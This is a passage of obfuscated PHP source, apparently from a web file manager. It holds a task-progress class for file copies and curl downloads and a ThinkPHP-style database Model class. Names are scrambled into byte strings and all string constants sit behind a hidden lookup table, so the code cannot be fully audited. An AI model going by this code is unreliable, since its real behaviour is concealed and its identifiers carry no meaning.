$­úÖÓŞã[$¼”©ßÜÅ[1643]]; } } public function addPath($ö•æŞ„—) { $§èµ•œ» =& $_SERVER[ê‘³Æ±]; if (!$ö•æŞ„—) { return; } $ÎŒªÊâÅ =& $this->task; $™»ñÔÃ® = IO::infoWithChildren($ö•æŞ„—); $¤ ³Â÷ª = $ÎŒªÊâÅ[$§èµ•œ»[1698]] ? $ÎŒªÊâÅ[$§èµ•œ»[1698]][$§èµ•œ»[1699]] : 0; $ÎŒªÊâÅ[$§èµ•œ»[1698]] = array($§èµ•œ»[1699] => $¤ ³Â÷ª + 1, $§èµ•œ»[414] => $™»ñÔÃ®[$§èµ•œ»[32]], $§èµ•œ»[78] => $™»ñÔÃ®[$§èµ•œ»[78]], $§èµ•œ»[512] => $™»ñÔÃ®[$§èµ•œ»[512]] ? $™»ñÔÃ®[$§èµ•œ»[512]] : $™»ñÔÃ®[$§èµ•œ»[78]]); if ($™»ñÔÃ®[$§èµ•œ»[33]] == $§èµ•œ»[194]) { $ÎŒªÊâÅ[$§èµ•œ»[772]] += 1; } else { $ÎŒªÊâÅ[$§èµ•œ»[772]] += $™»ñÔÃ®[$§èµ•œ»[83]][$§èµ•œ»[81]]; if ($™»ñÔÃ®[$§èµ•œ»[396]]) { $ÎŒªÊâÅ[$§èµ•œ»[772]] += $™»ñÔÃ®[$§èµ•œ»[83]][$§èµ•œ»[82]] + 1; } } $ÎŒªÊâÅ[$§èµ•œ»[749]] += $™»ñÔÃ®[$§èµ•œ»[80]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($öÅöÀòß) { $ùüêîÑ¢ =& $_SERVER[ê‘³Æ±]; $İñ½ÙÛ =& $this->task; $İñ½ÙÛ[$ùüêîÑ¢[1687]] = $öÅöÀòß[$ùüêîÑ¢[32]]; $İñ½ÙÛ[$ùüêîÑ¢[1053]] = $öÅöÀòß[$ùüêîÑ¢[32]]; $this->update(); } public function copyFileStart($÷‘ö‘êñ, $¨Ö‰‘ıÂ, $µ˜şÎ, $×ôÊ÷Ÿ, $ÃñÔ¯—”, $¸˜’´úñ) { $ŒÊ¢ü« =& $_SERVER[ê‘³Æ±]; $´³³õ¡¶ = $ÃñÔ¯—”; if ($´³³õ¡¶ == $GLOBALS[$ŒÊ¢ü«[1700]]) { $´³³õ¡¶ = $GLOBALS[$ŒÊ¢ü«[1701]]; } $GLOBALS[$ŒÊ¢ü«[1701]] = $ÃñÔ¯—”; $GLOBALS[$ŒÊ¢ü«[1700]] = $¸˜’´úñ; $â¹±û¥• =& $this->task; $â¹±û¥•[$ŒÊ¢ü«[1687]] = $´³³õ¡¶; $â¹±û¥•[$ŒÊ¢ü«[1689]] = (int) $÷‘ö‘êñ->size($¨Ö‰‘ıÂ); $â¹±û¥•[$ŒÊ¢ü«[1690]] = 0; $â¹±û¥•[$ŒÊ¢ü«[1053]] = $ŒÊ¢ü«[12]; $â¹±û¥•[$ŒÊ¢ü«[1691]] = $ŒÊ¢ü«[12]; $â¹±û¥•[$ŒÊ¢ü«[1692]] = 0; $±ôáËƒß = $â¹±û¥•[$ŒÊ¢ü«[1689]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($â¹±û¥•[$ŒÊ¢ü«[394]] . $ŒÊ¢ü«[1702]); if ($±ôáËƒß && file_exists(get_path_father($×ôÊ÷Ÿ))) { Cache::set($â¹±û¥•[$ŒÊ¢ü«[394]] . $ŒÊ¢ü«[1702], $×ôÊ÷Ÿ); $â¹±û¥•[$ŒÊ¢ü«[1663]] = array($ŒÊ¢ü«[1703], $ŒÊ¢ü«[1704]); } $this->update(0, $±ôáËƒß); } public static function updateCopyLocalFileSize($ê•«éùü) { $›ş¦¯‹± =& $_SERVER[ê‘³Æ±]; $ÃúšÖí¤ = Cache::get($ê•«éùü[$›ş¦¯‹±[394]] . $›ş¦¯‹±[1702]); if (!$ÃúšÖí¤ || !file_exists($ÃúšÖí¤)) { return $ê•«éùü; } $ê•«éùü[$›ş¦¯‹±[1690]] = @filesize($ÃúšÖí¤); $ê•«éùü[$›ş¦¯‹±[1694]] += $ê•«éùü[$›ş¦¯‹±[1690]]; self::updateTask($ê•«éùü); return $ê•«éùü; } public function copyFileEnd($ÆéòÁìÎ, $à¤·ó¾Û, $«ÑˆÒòÀ, $‚ı°æ®İ, $³ò¨Áä, $¼ãÚí—) { $¶¾´š®¸ =& $_SERVER[ê‘³Æ±]; $Çû¥ºªÆ =& $this->task; $Çû¥ºªÆ[$¶¾´š®¸[1690]] = $Çû¥ºªÆ[$¶¾´š®¸[1689]]; $Çû¥ºªÆ[$¶¾´š®¸[1691]] = $¶¾´š®¸[12]; unset($Çû¥ºªÆ[$¶¾´š®¸[1663]]); if ($³ò¨Áä == $Çû¥ºªÆ[$¶¾´š®¸[1687]]) { $Çû¥ºªÆ[$¶¾´š®¸[1693]] += $Çû¥ºªÆ[$¶¾´š®¸[1689]]; $Çû¥ºªÆ[$¶¾´š®¸[1694]] = $Çû¥ºªÆ[$¶¾´š®¸[1693]]; $this->update(1); } else { $this->update(); $Çû¥ºªÆ[$¶¾´š®¸[1690]] = 0; } Cache::remove($Çû¥ºªÆ[$¶¾´š®¸[394]] . $¶¾´š®¸[1702]); self::log($¶¾´š®¸[1705] . $à¤·ó¾Û . $¶¾´š®¸[70] . $‚ı°æ®İ . $¶¾´š®¸[228] . $³ò¨Áä . $¶¾´š®¸[1706] . $Çû¥ºªÆ[$¶¾´š®¸[1687]]); } public function updateFileEnd($İñ„øà, $À¯ñ÷’‡) { $ô¥ù¾¾ =& $_SERVER[ê‘³Æ±]; $ùæšùº… =& $this->task; $ùæšùº…[$ô¥ù¾¾[1687]] = $İñ„øà; $ùæšùº…[$ô¥ù¾¾[1689]] = $À¯ñ÷’‡; $ùæšùº…[$ô¥ù¾¾[1693]] += $À¯ñ÷’‡; $ùæšùº…[$ô¥ù¾¾[1694]] = $ùæšùº…[$ô¥ù¾¾[1693]]; $this->update(1); self::log($ô¥ù¾¾[1707] . $İñ„øà); } public function sourceModelCopy($ùÊ»Ğ–É) { $—ıÃ† =& $_SERVER[ê‘³Æ±]; $¤Çó³œ = $ùÊ»Ğ–É[0]; $¥áò½ı = $ùÊ»Ğ–É[1]; $ÊŸ¦»°¼ =& $this->task; $this->sourceModelCopyFlag = !0; $¾Ÿôé¾Š = 0; switch ($¤Çó³œ) { case $—ıÃ†[562]: $¾Ÿôé¾Š = 1; break; case $—ıÃ†[565]: $ÊŸ¦»°¼[$—ıÃ†[1687]] = $¥áò½ı[$—ıÃ†[32]]; break; case $—ıÃ†[567]: $¾Ÿôé¾Š = intval($ùÊ»Ğ–É[$—ıÃ†[377]] * 0.4); break; case $—ıÃ†[569]: $¾Ÿôé¾Š = intval($ùÊ»Ğ–É[$—ıÃ†[377]] * 0.2); break; case $—ıÃ†[571]: $¾Ÿôé¾Š = intval($ùÊ»Ğ–É[$—ıÃ†[377]] * 0.4); break; } $this->update($¾Ÿôé¾Š); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ÔÇ¼›²³, $ùıúí«”) { $ú´¦î¯¨ =& $_SERVER[ê‘³Æ±]; $this->sourceModelCopyFlag = !0; $ÏÎóÏòÊ = 1; if (isset($ÔÇ¼›²³[$ú´¦î¯¨[83]])) { $ÏÎóÏòÊ = $ÔÇ¼›²³[$ú´¦î¯¨[83]][$ú´¦î¯¨[81]] + $ÔÇ¼›²³[$ú´¦î¯¨[83]][$ú´¦î¯¨[82]] + 1; } $this->update($ÏÎóÏòÊ); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÀË«óŠ„) { $this->sourceRemove($ÀË«óŠ„, !1); } public function curlProgress($È——Ó£•, $³‘Ù¥Ì«, $ÒÂ¡Ğ½, $ÌÂã„õ, $ö·×Í˜–) { $…·¬·Å =& $_SERVER[ê‘³Æ±]; $ÔÎ‚å‚‰ =& $this->task; if ($ö·×Í˜– > 0) { $ÔÎ‚å‚‰[$…·¬·Å[1053]] = $…·¬·Å[1708]; $ÔÎ‚å‚‰[$…·¬·Å[1691]] = $…·¬·Å[108]; if ($ÔÎ‚å‚‰[$…·¬·Å[1689]]) { $ÔÎ‚å‚‰[$…·¬·Å[1690]] = $ö·×Í˜–; } if ($ÔÎ‚å‚‰[$…·¬·Å[1692]]) { $ÔÎ‚å‚‰[$…·¬·Å[1690]] = $ö·×Í˜– + $ÔÎ‚å‚‰[$…·¬·Å[1692]]; } } else { if ($ÒÂ¡Ğ½ > 0) { if ($ÔÎ‚å‚‰[$…·¬·Å[1689]] == $³‘Ù¥Ì«) { $ÔÎ‚å‚‰[$…·¬·Å[1690]] = $ÒÂ¡Ğ½; $ÔÎ‚å‚‰[$…·¬·Å[1053]] = $…·¬·Å[1709]; $ÔÎ‚å‚‰[$…·¬·Å[1691]] = $…·¬·Å[1186]; } } } $this->update(); } public function curlProgressStart($½Ø‹ê¹Ò) { } public function curlProgressEnd($ö¹¾ŠÀ) { $–·ÜõÌÃ =& $_SERVER[ê‘³Æ±]; $µÜÑåÓÍ =& $this->task; $ØŠ›„« = curl_getinfo($ö¹¾ŠÀ); $¾Ÿ­‚şÔ = $ØŠ›„«[$–·ÜõÌÃ[1710]]; if ($¾Ÿ­‚şÔ == -1) { $¾Ÿ­‚şÔ = $ØŠ›„«[$–·ÜõÌÃ[1711]]; } if ($µÜÑåÓÍ[$–·ÜõÌÃ[1691]] == $–·ÜõÌÃ[108] && $¾Ÿ­‚şÔ) { $µÜÑåÓÍ[$–·ÜõÌÃ[1692]] += $¾Ÿ­‚şÔ; } $this->update(); } } goto FÛ‰ÇÍïÃ­; aâ¤ ¹±Ä´: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\x65", "\x6f\162\x64\145\x72", "\141\x6c\x69\141\x73", "\150\141\166\x69\156\147", "\x67\162\x6f\165\160", "\154\157\143\x6b", "\x64\151\x73\x74\151\x6e\143\164", "\x61\x75\164\157", "\x66\x69\154\x74\x65\162", "\166\141\154\151\x64\x61\164\145", "\162\x65\x73\165\x6c\164", "\142\151\156\x64", "\x74\x6f\153\145\156"); public function __construct($“õ°‘¥ = '', $±Ş»ÅÚ¦ = '', $£åİäç  = '') { $Ôãü„óÖ =& $_SERVER[ê‘³Æ±]; $this->_initialize(); if (!empty($“õ°‘¥)) { if (strpos($“õ°‘¥, $Ôãü„óÖ[10])) { list($this->dbName, $this->name) = explode($Ôãü„óÖ[10], $“õ°‘¥); } else { $this->name = $“õ°‘¥; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($±Ş»ÅÚ¦)) { $this->tablePrefix = $Ôãü„óÖ[12]; } elseif ($Ôãü„óÖ[12] != $±Ş»ÅÚ¦) { $this->tablePrefix = $±Ş»ÅÚ¦; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ôãü„óÖ[241]); } $this->db(0, empty($this->connection) ? $£åİäç  : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ ¡ÊÍ§ñ =& $_SERVER[ê‘³Æ±]; if (empty($this->fields)) { if (think_config($ ¡ÊÍ§ñ[242])) { $ÏÜŒÖÚ = $this->dbName ? $this->dbName : think_config($ ¡ÊÍ§ñ[243]); $Á†åó­ = think_var_cache($ ¡ÊÍ§ñ[244] . strtolower(get_path_this($ÏÜŒÖÚ) . $ ¡ÊÍ§ñ[10] . $this->name)); if ($Á†åó­) { $ÁØŞğ‘ = think_config($ ¡ÊÍ§ñ[245]); if (empty($ÁØŞğ‘) || $Á†åó­[$ ¡ÊÍ§ñ[246]] == $ÁØŞğ‘) { $this->fields = $Á†åó­; return; } } } $this->flush(); } } public function flush() { $å±ÙƒÍ­ =& $_SERVER[ê‘³Æ±]; $this->db->setModel($this->name); $Ö¡äîü‰ = $this->db->getFields($this->getTableName()); if (!$Ö¡äîü‰) { return !1; } $this->fields = array_keys($Ö¡äîü‰); $this->fields[$å±ÙƒÍ­[247]] = !1; foreach ($Ö¡äîü‰ as $“Û‰œ³Š => $¢Î¼³‘È) { $Ó‘¬èšµ[$“Û‰œ³Š] = $¢Î¼³‘È[$å±ÙƒÍ­[33]]; if ($¢Î¼³‘È[$å±ÙƒÍ­[39]]) { $this->fields[$å±ÙƒÍ­[248]] = $“Û‰œ³Š; if ($¢Î¼³‘È[$å±ÙƒÍ­[42]]) { $this->fields[$å±ÙƒÍ­[247]] = !0; } } } $this->fields[$å±ÙƒÍ­[249]] = $Ó‘¬èšµ; if (think_config($å±ÙƒÍ­[245])) { $this->fields[$å±ÙƒÍ­[246]] = think_config($å±ÙƒÍ­[245]); } if (think_config($å±ÙƒÍ­[242])) { $Ç†¯°¾£ = $this->dbName ? $this->dbName : think_config($å±ÙƒÍ­[243]); think_var_cache($å±ÙƒÍ­[244] . strtolower(get_path_this($Ç†¯°¾£) . $å±ÙƒÍ­[10] . $this->name), $this->fields); } } public function switchModel($©™¢º, $œŸÚ ñá = array()) { $É²”†©÷ =& $_SERVER[ê‘³Æ±]; $²¥´·ê† = ucwords(strtolower($©™¢º)) . $É²”†©÷[250]; if (!class_exists($²¥´·ê†)) { think_exception($²¥´·ê† . think_lang($É²”†©÷[251])); } $this->_extModel = new $²¥´·ê†($this->name); if (!empty($œŸÚ ñá)) { foreach ($œŸÚ ñá as $ëÓöŒ°ê) { $this->_extModel->setProperty($ëÓöŒ°ê, $this->{$ëÓöŒ°ê}); } } return $this->_extModel; } public function __set($ÂÍ±¬á¸, $È§¶êõÒ) { $this->data[$ÂÍ±¬á¸] = $È§¶êõÒ; } public function __get($ á’ªáË) { return isset($this->data[$ á’ªáË]) ? $this->data[$ á’ªáË] : null; } public function __isset($×·æÑº) { return isset($this->data[$×·æÑº]); } public function __unset($Èú°ã©º) { unset($this->data[$Èú°ã©º]); } public function __call($½ÑÉ‹ˆ·, $ŸÖì¿ÅŠ) { $‰…†ëŸ =& $_SERVER[ê‘³Æ±]; if (in_array(strtolower($½ÑÉ‹ˆ·), $this->methods, !0)) { $this->options[strtolower($½ÑÉ‹ˆ·)] = $ŸÖì¿ÅŠ[0]; return $this; } elseif (in_array(strtolower($½ÑÉ‹ˆ·), array($‰…†ëŸ[252], $‰…†ëŸ[253], $‰…†ëŸ[254], $‰…†ëŸ[255], $‰…†ëŸ[256]), !0)) { $×ô•ªÇØ = isset($ŸÖì¿ÅŠ[0]) ? $ŸÖì¿ÅŠ[0] : $‰…†ëŸ[183]; $×ô•ªÇØ = $this->db->parseKey($×ô•ªÇØ); return $this->getField(strtoupper($½ÑÉ‹ˆ·) . $‰…†ëŸ[257] . $×ô•ªÇØ . $‰…†ëŸ[258] . $½ÑÉ‹ˆ·, $‰…†ëŸ[252]); } elseif (strtolower(substr($½ÑÉ‹ˆ·, 0, 5)) == $‰…†ëŸ[259]) { $×ô•ªÇØ = think_parse_name(substr($½ÑÉ‹ˆ·, 5)); $éèğß¼š[$×ô•ªÇØ] = $ŸÖì¿ÅŠ[0]; return $this->where($éèğß¼š)->find(); } elseif (strtolower(substr($½ÑÉ‹ˆ·, 0, 10)) == $‰…†ëŸ[260]) { $ªƒ­é²‰ = think_parse_name(substr($½ÑÉ‹ˆ·, 10)); $éèğß¼š[$ªƒ­é²‰] = $ŸÖì¿ÅŠ[0]; return $this->where($éèğß¼š)->getField($ŸÖì¿ÅŠ[1]); } elseif (isset($this->_scope[$½ÑÉ‹ˆ·])) { return $this->scope($½ÑÉ‹ˆ·, $ŸÖì¿ÅŠ[0]); } elseif (method_exists($this, $½ÑÉ‹ˆ·)) { array_unshift($ŸÖì¿ÅŠ, $½ÑÉ‹ˆ·); return call_user_func_array(array($this, $‰…†ëŸ[261]), $ŸÖì¿ÅŠ); } else { return call_user_func_array(array(parent, $½ÑÉ‹ˆ·), $ŸÖì¿ÅŠ); } } protected function call() { $‹‘¤èÂº =& $_SERVER[ê‘³Æ±]; $™İ—ş÷º = func_get_args(); $¦ªùÃóú = array_shift($™İ—ş÷º); $˜Şñ²„ø = $¦ªùÃóú; if (is_array($¦ªùÃóú)) { $˜Şñ²„ø = $¦ªùÃóú[1]; $¦ªùÃóú = $¦ªùÃóú[0]; } $á¸¡—ØÑ = count($™İ—ş÷º) - 1; if (isset($™İ—ş÷º[$á¸¡—ØÑ]) && $™İ—ş÷º[$á¸¡—ØÑ] === $¦ªùÃóú) { think_exception(__CLASS__ . $‹‘¤èÂº[4] . $¦ªùÃóú . think_lang($‹‘¤èÂº[262])); return; } $™İ—ş÷º[] = $¦ªùÃóú; if (method_exists($this, $‹‘¤èÂº[263])) { $ğéêå³® = call_user_func_array(array($this, $‹‘¤èÂº[264]), array($˜Şñ²„ø, $™İ—ş÷º)); if (!is_null($ğéêå³®) && $ğéêå³® !== !1) { return $ğéêå³®; } } $™Ø »¼· = call_user_func_array(array($this, $¦ªùÃóú), $™İ—ş÷º); if (method_exists($this, $‹‘¤èÂº[265])) { $ğéêå³® = call_user_func_array(array($this, $‹‘¤èÂº[266]), array($˜Şñ²„ø, $™İ—ş÷º, $™Ø »¼·)); if ($ğéêå³®) { return $ğéêå³®; } } return $™Ø »¼·; } protected function _initialize() { } protected function _facade($„ÕœƒˆĞ) { $Ù¶ş¤šê =& $_SERVER[ê‘³Æ±]; if (!empty($this->fields)) { foreach ($„ÕœƒˆĞ as $¿ñ³µÇÁ => $½î£ãÌ) { if (is_array($this->fields) && !in_array($¿ñ³µÇÁ, $this->fields, !0)) { unset($„ÕœƒˆĞ[$¿ñ³µÇÁ]); } elseif (is_scalar($½î£ãÌ)) { $this->_parseType($„ÕœƒˆĞ, $¿ñ³µÇÁ); } } } if (!empty($this->options[$Ù¶ş¤šê[267]])) { $„ÕœƒˆĞ = array_map($this->options[$Ù¶ş¤šê[267]], $„ÕœƒˆĞ); unset($this->options[$Ù¶ş¤šê[267]]); } $this->_beforeWrite($„ÕœƒˆĞ); return $„ÕœƒˆĞ; } protected function _beforeWrite(&$ÔŞæ‹Ë™) { } public function add($·‡ÚâÕğ = '', $†¬˜¡É = array(), $ö‹™±©Á = false) { if (empty($·‡ÚâÕğ)) { if (!empty($this->data)) { $·‡ÚâÕğ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ê‘³Æ±][268]); return !1; } } $†¬˜¡É = $this->_parseOptions($†¬˜¡É); $·‡ÚâÕğ = $this->_facade($·‡ÚâÕğ); if (!1 === $this->_beforeInsert($·‡ÚâÕğ, $†¬˜¡É)) { return !1; } $ŞÙâß = $this->db->insert($·‡ÚâÕğ, $†¬˜¡É, $ö‹™±©Á); if (!1 !== $ŞÙâß) { $ß€ÕÏØó = $this->getLastInsID(); if ($ß€ÕÏØó) { $·‡ÚâÕğ[$this->getPk()] = $ß€ÕÏØó; $this->_after_insert($·‡ÚâÕğ, $†¬˜¡É); return $ß€ÕÏØó; } $this->_after_insert($·‡ÚâÕğ, $†¬˜¡É); } return $ŞÙâß; } protected function _beforeInsert(&$êÂÆŞ–ğ, $ºæ‡î¤›) { } protected function _after_insert($õâÇ´È‚, $å°µüèé) { } public function addAll($©ÖôšğÂ, $±Ùó€¢Ó = array(), $Ö§®‘¤¦ = false) { $ÍÑ§ğ›ï =& $_SERVER[ê‘³Æ±]; if (empty($©ÖôšğÂ)) { $this->error = think_lang($ÍÑ§ğ›ï[268]); return !1; } $±Ùó€¢Ó = $this->_parseOptions($±Ùó€¢Ó); foreach ($©ÖôšğÂ as $µÚÌƒá => $ïÆõ“¥¿) { $©ÖôšğÂ[$µÚÌƒá] = $this->_facade($ïÆõ“¥¿); } if (method_exists($this->db, $ÍÑ§ğ›ï[269])) { $ùµÌ·ªè = $this->db->insertAll($©ÖôšğÂ, $±Ùó€¢Ó, $Ö§®‘¤¦); } else { $this->startTrans(); foreach ($©ÖôšğÂ as $µÚÌƒá => $ïÆõ“¥¿) { $ùµÌ·ªè = $this->db->insert($ïÆõ“¥¿, $±Ùó€¢Ó, $Ö§®‘¤¦); } $this->commit(); } if (!1 !== $ùµÌ·ªè) { $“‚„ñÎ™ = $this->getLastInsID(); if ($“‚„ñÎ™) { return $“‚„ñÎ™; } } return $ùµÌ·ªè; } public function selectAdd($Âà¡æÅ = '', $‡³Š†²Ù = '', $‡÷¤¦Ğâ = array()) { $ËŸµ…²„ =& $_SERVER[ê‘³Æ±]; $‡÷¤¦Ğâ = $this->_parseOptions($‡÷¤¦Ğâ); if (!1 === ($˜èä¨¬‚ = $this->db->selectInsert($Âà¡æÅ ? $Âà¡æÅ : $‡÷¤¦Ğâ[$ËŸµ…²„[270]], $‡³Š†²Ù ? $‡³Š†²Ù : $this->getTableName(), $‡÷¤¦Ğâ))) { $this->error = think_lang($ËŸµ…²„[271]); return !1; } else { return $˜èä¨¬‚; } } public function save($ÌıÎßÖà = '', $ÓšŠ = array()) { $ÉÀŞ¼ =& $_SERVER[ê‘³Æ±]; if (empty($ÌıÎßÖà)) { if (!empty($this->data)) { $ÌıÎßÖà = $this->data; $this->data = array(); } else { $this->error = think_lang($ÉÀŞ¼[268]); return !1; } } $ÌıÎßÖà = $this->_facade($ÌıÎßÖà); $ÓšŠ = $this->_parseOptions($ÓšŠ); $œ„¡É“Ï = $this->getPk(); if (!isset($ÓšŠ[$ÉÀŞ¼[272]])) { if (isset($ÌıÎßÖà[$œ„¡É“Ï])) { $¯ìê÷Ş‚[$œ„¡É“Ï] = $ÌıÎßÖà[$œ„¡É“Ï]; $ÓšŠ[$ÉÀŞ¼[272]] = $¯ìê÷Ş‚; unset($ÌıÎßÖà[$œ„¡É“Ï]); } else { $this->error = think_lang($ÉÀŞ¼[271]); return !1; } } if (is_array($ÓšŠ[$ÉÀŞ¼[272]]) && isset($ÓšŠ[$ÉÀŞ¼[272]][$œ„¡É“Ï])) { $ËØ¼ˆ• = $ÓšŠ[$ÉÀŞ¼[272]][$œ„¡É“Ï]; } if (!1 === $this->_beforeUpdate($ÌıÎßÖà, $ÓšŠ)) { return !1; } $Äüé€ç = $this->db->update($ÌıÎßÖà, $ÓšŠ); if (!1 !== $Äüé€ç) { if (isset($ËØ¼ˆ•)) { $ÌıÎßÖà[$œ„¡É“Ï] = $ËØ¼ˆ•; } $this->_afterUpdate($ÌıÎßÖà, $ÓšŠ); } return $Äüé€ç; } protected function _beforeUpdate(&$¬ø—ƒ¥°, $šßÅ˜´ë) { } protected function _afterUpdate($æ·¯Ãíù, $ÕºîÚâ) { } public function delete($Éğ²€© = array()) { $¦¼ïì´Ë =& $_SERVER[ê‘³Æ±]; if (empty($Éğ²€©) && empty($this->options[$¦¼ïì´Ë[272]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $“¥ĞÒ®Ó = $this->getPk(); if (is_numeric($Éğ²€©) || is_string($Éğ²€©)) { if (strpos($Éğ²€©, $¦¼ïì´Ë[50])) { $Šğ¤Ñòã[$“¥ĞÒ®Ó] = array($¦¼ïì´Ë[273], $Éğ²€©); } else { $Šğ¤Ñòã[$“¥ĞÒ®Ó] = $Éğ²€©; } $this->options[$¦¼ïì´Ë[272]] = $Šğ¤Ñòã; } $Éğ²€© = $this->_parseOptions(); if (is_array($Éğ²€©[$¦¼ïì´Ë[272]]) && isset($Éğ²€©[$¦¼ïì´Ë[272]][$“¥ĞÒ®Ó])) { $ÄØ‡õò¿ = $Éğ²€©[$¦¼ïì´Ë[272]][$“¥ĞÒ®Ó]; } $Û­…×¢ö = $this->db->delete($Éğ²€©); if (!1 !== $Û­…×¢ö) { $ê‘š¢¨ô = array(); if (isset($ÄØ‡õò¿)) { $ê‘š¢¨ô[$“¥ĞÒ®Ó] = $ÄØ‡õò¿; } $this->_after_delete($ê‘š¢¨ô, $Éğ²€©); } return $Û­…×¢ö; } protected function _after_delete($¹™üÔ–é, $öå¿´ò) { } public function select($ËÓ»áŠ• = array()) { $¿†…ñâß =& $_SERVER[ê‘³Æ±]; if (is_string($ËÓ»áŠ•) || is_numeric($ËÓ»áŠ•)) { $Ö´¦§½ = $this->getPk(); if (strpos($ËÓ»áŠ•, $¿†…ñâß[50])) { $ùÜ§µœá[$Ö´¦§½] = array($¿†…ñâß[273], $ËÓ»áŠ•); } else { $ùÜ§µœá[$Ö´¦§½] = $ËÓ»áŠ•; } $this->options[$¿†…ñâß[272]] = $ùÜ§µœá; } elseif (!1 === $ËÓ»áŠ•) { $ËÓ»áŠ• = $this->_parseOptions(); return $¿†…ñâß[274] . $this->db->buildSelectSql($ËÓ»áŠ•) . $¿†…ñâß[275]; } $ËÓ»áŠ• = $this->_parseOptions(); $ àŠÈÛÀ = $this->db->select($ËÓ»áŠ•); if (!1 === $ àŠÈÛÀ) { return !1; } if (empty($ àŠÈÛÀ)) { return null; } $this->_afterSelect($ àŠÈÛÀ, $ËÓ»áŠ•); return $ àŠÈÛÀ; } protected function _afterSelect(&$Ö©ÓàÛ, $ïÇö÷ĞÍ) { } public function buildSql($ß‹¶ğ = array()) { $’€®íÚä =& $_SERVER[ê‘³Æ±]; $ß‹¶ğ = $this->_parseOptions($ß‹¶ğ); return $’€®íÚä[274] . $this->db->buildSelectSql($ß‹¶ğ) . $’€®íÚä[275]; } public function optionsValue($ù¯™ªë£ = null) { if (is_null($ù¯™ªë£)) { return $this->options; } elseif (is_array($ù¯™ªë£)) { $this->options = array_merge($this->options, $ù¯™ªë£); } } protected function _parseOptions($Èáİãáâ = array()) { $åø‰¢Œ¾ =& $_SERVER[ê‘³Æ±]; if (is_array($Èáİãáâ)) { $Èáİãáâ = array_merge($this->options, $Èáİãáâ); } $this->options = array(); if (!isset($Èáİãáâ[$åø‰¢Œ¾[276]])) { $Èáİãáâ[$åø‰¢Œ¾[276]] = $this->getTableName(); $ó””Í§œ = $this->fields; } else { $ó””Í§œ = $this->getDbFields(); } if (!empty($Èáİãáâ[$åø‰¢Œ¾[277]])) { $Èáİãáâ[$åø‰¢Œ¾[276]] .= $åø‰¢Œ¾[53] . $Èáİãáâ[$åø‰¢Œ¾[277]]; } $Èáİãáâ[$åø‰¢Œ¾[278]] = $this->name; if (isset($Èáİãáâ[$åø‰¢Œ¾[272]]) && is_array($Èáİãáâ[$åø‰¢Œ¾[272]]) && !empty($ó””Í§œ) && !isset($Èáİãáâ[$åø‰¢Œ¾[279]]) && !isset($Èáİãáâ[$åø‰¢Œ¾[276]])) { foreach ($Èáİãáâ[$åø‰¢Œ¾[272]] as $„ÒÎãëÓ => $°³¨§²÷) { $„ÒÎãëÓ = trim($„ÒÎãëÓ); if (in_array($„ÒÎãëÓ, $ó””Í§œ, !0)) { if (is_scalar($°³¨§²÷)) { $this->_parseType($Èáİãáâ[$åø‰¢Œ¾[272]], $„ÒÎãëÓ); } } elseif (!is_numeric($„ÒÎãëÓ) && $åø‰¢Œ¾[11] != substr($„ÒÎãëÓ, 0, 1) && !1 === strpos($„ÒÎãëÓ, $åø‰¢Œ¾[10]) && !1 === strpos($„ÒÎãëÓ, $åø‰¢Œ¾[257]) && !1 === strpos($„ÒÎãëÓ, $åø‰¢Œ¾[280]) && !1 === strpos($„ÒÎãëÓ, $åø‰¢Œ¾[281])) { unset($Èáİãáâ[$åø‰¢Œ¾[272]][$„ÒÎãëÓ]); } } } $this->_options_filter($Èáİãáâ); return $Èáİãáâ; } protected function _options_filter(&$şªÖŞÅŒ) { } protected function _parseType(&$ÌëÔãÃ£, $ŞĞƒÚôÍ) { $ÑÄÍÓ¸½ =& $_SERVER[ê‘³Æ±]; if (empty($this->options[$ÑÄÍÓ¸½[282]][$ÑÄÍÓ¸½[4] . $ŞĞƒÚôÍ])) { $ƒ±¢ ¢è = strtolower($this->fields[$ÑÄÍÓ¸½[249]][$ŞĞƒÚôÍ]); if (!1 !== strpos($ƒ±¢ ¢è, $ÑÄÍÓ¸½[283])) { } elseif (!1 === strpos($ƒ±¢ ¢è, $ÑÄÍÓ¸½[284]) && !1 !== strpos($ƒ±¢ ¢è, $ÑÄÍÓ¸½[285])) { $ÌëÔãÃ£[$ŞĞƒÚôÍ] = intval($ÌëÔãÃ£[$ŞĞƒÚôÍ]); } elseif (!1 !== strpos($ƒ±¢ ¢è, $ÑÄÍÓ¸½[286]) || !1 !== strpos($ƒ±¢ ¢è, $ÑÄÍÓ¸½[287])) { $ÌëÔãÃ£[$ŞĞƒÚôÍ] = floatval($ÌëÔãÃ£[$ŞĞƒÚôÍ]); } elseif (!1 !== strpos($ƒ±¢ ¢è, $ÑÄÍÓ¸½[288])) { $ÌëÔãÃ£[$ŞĞƒÚôÍ] = (bool) $ÌëÔãÃ£[$ŞĞƒÚôÍ]; } } } public function find($´ÉÜÃä = array()) { $Ş”…œö  =& $_SERVER[ê‘³Æ±]; if (is_numeric($´ÉÜÃä) || is_string($´ÉÜÃä)) { $“òÙîˆ”[$this->getPk()] = intval($´ÉÜÃä); $this->options[$Ş”…œö [272]] = $“òÙîˆ”; } $this->options[$Ş”…œö [289]] = 1; $´ÉÜÃä = $this->_parseOptions(); $ğ¾óåæ = $this->db->select($´ÉÜÃä); if (!1 === $ğ¾óåæ) { return !1; } if (empty($ğ¾óåæ)) { return null; } $this->data = $ğ¾óåæ[0]; $this->_afterFind($this->data, $´ÉÜÃä); if (!empty($this->options[$Ş”…œö [290]])) { return $this->returnResult($this->data, $this->options[$Ş”…œö [290]]); } return $this->data; } protected function 